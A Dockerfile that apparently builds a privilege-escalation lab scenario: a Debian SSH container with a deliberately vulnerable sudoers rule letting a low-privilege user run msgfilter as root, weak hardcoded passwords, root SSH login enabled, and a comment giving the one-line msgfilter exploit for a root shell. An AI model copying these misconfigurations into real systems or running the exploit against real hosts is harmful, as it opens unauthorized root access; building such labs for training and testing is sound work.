FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_msgfilter
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/msgfilter as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and gettext (which provides msgfilter)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        gettext \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify msgfilter is installed
RUN which msgfilter && ls -la /usr/bin/msgfilter

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# msgfilter can execute arbitrary commands as a filter program.
# Exploit: echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
# This spawns an interactive root shell.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/msgfilter" > /etc/sudoers.d/msgfilter && \
    chmod 440 /etc/sudoers.d/msgfilter

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]